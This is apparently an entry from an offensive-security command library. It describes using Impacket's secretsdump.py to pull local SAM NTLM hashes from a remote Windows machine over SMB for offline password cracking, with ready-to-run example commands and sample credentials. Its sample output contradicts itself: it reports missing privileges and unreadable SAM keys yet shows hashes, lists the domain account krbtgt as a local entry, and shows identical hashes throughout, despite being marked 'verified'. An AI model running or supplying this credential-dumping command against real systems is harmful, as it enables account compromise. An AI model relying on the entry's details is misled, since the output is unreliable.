---
id: a87ed429-8db3-4bd4-8424-2ac200c81d5a
name: secretsdump-smb-sam-dump
type: command
executor: python
data: 'secretsdump.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_TARGET_IP -sam'
output: >
  Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation


  Password: 

  SMB SessionError: STATUS_MORE_PROCESSING_REQUIRED(0xC0000016)

  [-] User SMBADMIN doesn't have admin privileges on DESKTOP-ABC


  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


  [-] No seDebugPrivilege, cannot read SAM hive keys
created_at: '2023-01-01T00:00:00Z'
updated_at: '2023-01-01T00:00:00Z'
platforms:
  - Windows
tags:
  - credential-dumping
  - smb
  - sam
verified: true
validated: true
---

# secretsdump-smb-sam-dump

## Command

```python
secretsdump.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_TARGET_IP -sam
```

## Description

Executes secretsdump.py to dump the local SAM database hashes from a remote Windows target over SMB. This command authenticates with domain credentials and extracts NTLM hashes for local accounts, useful for offline password cracking.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | Target domain name (e.g., WORKGROUP for local) | Yes |
| $_USERNAME | Username for authentication | Yes |
| $_PASSWORD | Password for the user (or NTLM hash with -no-pass) | Yes |
| $_TARGET_IP | IP address of the target machine | Yes |
| -sam | Flag to dump only SAM hashes | Built-in |

## Examples

### Basic Usage

```python
secretsdump.py WORKGROUP/Administrator:Password123@192.168.1.10 -sam
```

Dumps SAM hashes from a local Windows machine.

### Advanced Usage

```python
secretsdump.py DOMAIN/Administrator:Password123@192.168.1.10 -sam -outputfile sam_dumps.txt
```

Dumps SAM hashes and saves to a file.

## Expected Output

Output includes user accounts with their NTLM hashes, such as:

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

If no admin privileges, it may show partial results or errors.

## Related

- [[procedures/Dump-Local-Credentials-via-SMB]]
- [[tools/Impacket]]
